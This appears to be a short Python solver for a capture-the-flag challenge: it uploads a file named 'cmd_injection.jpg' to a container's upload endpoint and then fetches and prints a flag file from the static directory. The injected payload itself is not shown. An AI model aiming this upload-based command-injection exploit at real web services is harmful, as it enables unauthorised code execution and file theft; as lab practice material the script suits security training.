import requests

url = "Container_IP"

def send_img():

	file = {'file':('cmd_injection.jpg',open("cmd_injection.jpg","rb"))}
	x = requests.post(url+"/api/upload",files=file)
def get_flag():
	x = requests.get(url+"/static/petpets/flag.txt")
	return x.text

if __name__ == '__main__':
	send_img()
	flag = get_flag()
	print(flag)
